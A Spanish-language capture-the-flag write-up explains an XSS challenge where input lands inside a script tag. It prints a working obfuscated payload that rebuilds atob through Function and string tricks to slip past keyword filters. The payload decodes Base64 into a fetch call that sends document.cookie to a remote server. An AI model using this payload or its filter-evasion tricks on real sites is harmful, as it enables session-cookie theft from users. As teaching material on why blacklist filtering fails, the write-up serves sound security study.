# Writeup: Solución al reto de XSS dentro de `<script>`

## Introducción

En este reto, el payload se inyectaba directamente dentro de una etiqueta `<script>`.  
Aunque pareciera que ejecutar código era trivial, el desafío estaba en que **existían restricciones fuertes**:
- Se filtraban muchas funciones peligrosas (`eval`, `atob`, `fetch`, etc.).
- Había filtrado o detección de palabras clave críticas.
- No se podía escribir directamente código malicioso obvio.

Aun así, era posible **ejecutar JavaScript malicioso** de forma **camuflada** y **dinámica**.

---

## Payload utilizado

```javascript
positivo";Function(Function("rextuxrn axtxob".replaceAll("x",""))()("ZmV0Y2goImh0dHBzOi8vc2Vydmlkb3JyZW1vdG8vP2M9Ii5jb25jYXQoZG9jdW1lbnQuY29va2llKSk7"))();"
```

---

## Explicación paso a paso

1. **Contexto dentro de `<script>`**:
   - El código estaba embebido en un `<script>`, lo que significa que **ya se ejecutaba como JavaScript**.
   - No hacía falta cerrar etiquetas ni atributos, pero era necesario **escapar adecuadamente la sintaxis previa** (por ejemplo, si había una cadena abierta).

2. **Escape de contexto**:
   - Se cierra la cadena abierta del script (si existía) usando `positivo";`.
   - A partir de ahí, el atacante tiene control total para ejecutar código JavaScript.

3. **Construcción dinámica de funciones**:
   - `"rextuxrn axtxob".replaceAll("x","")` genera el string `"return atob"`.
   - `Function("return atob")()` evalúa dinámicamente y devuelve la función `atob`.
   - **`atob()`** se usa para decodificar código que estaba oculto en Base64.

4. **Ejecución del código oculto**:
   - Se decodifica el siguiente Base64:
     ```
     ZmV0Y2goImh0dHBzOi8vc2Vydmlkb3JyZW1vdG8vP2M9Ii5jb25jYXQoZG9jdW1lbnQuY29va2llKSk7
     ```
   - Que resulta ser:
     ```javascript
     fetch("https://servidorremoto/?c=".concat(document.cookie));
     ```
   - Este código **roba las cookies** del navegador de la víctima enviándolas a un servidor del atacante.

5. **Resumen del flujo**:
   - Escape del contexto de script ➔ Construcción dinámica de `atob` ➔ Decodificación de payload ➔ Ejecución de `fetch()`.

---

## ¿Por qué esta solución fue efectiva?

- **Evasión de palabras clave**: No se mencionaron directamente `fetch` ni `atob` ni `eval`, evitando los filtros.
- **Cifrado de la carga**: El uso de Base64 permitió esconder el código real.
- **Uso de `Function`**: Ejecutar código a partir de strings generados dinámicamente evitó la detección por filtros básicos.
- **Contexto favorable**: Estar dentro de `<script>` eliminaba muchas dificultades típicas de XSS (como inyectar HTML).

---

## Reflexión final

Incluso en entornos muy restringidos, mientras el atacante pueda:
- Escapar del contexto de ejecución actual.
- Usar funciones de evaluación dinámica (`Function`, `eval`, `setTimeout("...")`, etc.).
- Construir indirectamente funciones prohibidas.

Es **posible realizar XSS**.  
Este reto demuestra que **la seguridad basada solo en filtrados o listas negras es insuficiente**.
